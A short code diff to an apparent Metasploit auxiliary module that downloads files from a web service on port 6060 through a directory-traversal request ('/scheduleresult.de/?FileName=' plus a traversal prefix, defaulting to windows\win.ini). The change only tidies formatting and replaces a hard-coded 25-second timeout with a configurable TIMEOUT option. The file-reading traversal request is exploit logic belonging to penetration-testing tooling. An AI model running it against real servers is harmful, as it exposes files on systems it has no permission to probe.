@@ -38,11 +38,16 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(6060),
-        OptBool.new('SSL',   [true, 'Use SSL', true]),
-        OptString.new('FILEPATH', [true, 'The name of the file to download', 'windows\\win.ini'])
+        OptBool.new('SSL', [ true, 'Use SSL', true ]),
+        OptString.new('FILEPATH', [ true, 'The name of the file to download', 'windows\\win.ini' ]),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 25 ])
       ], self.class)
 
     deregister_options('RHOST')
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 25
   end
 
   def run_host(ip)
@@ -52,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
     res = send_request_raw({
       'uri' => "/scheduleresult.de/?FileName=#{traverse}#{filename}",
       'method' => 'GET'
-    }, 25)
+    }, timeout)
 
     if res
       print_status("#{ip}:#{rport} returns: #{res.code.to_s}")
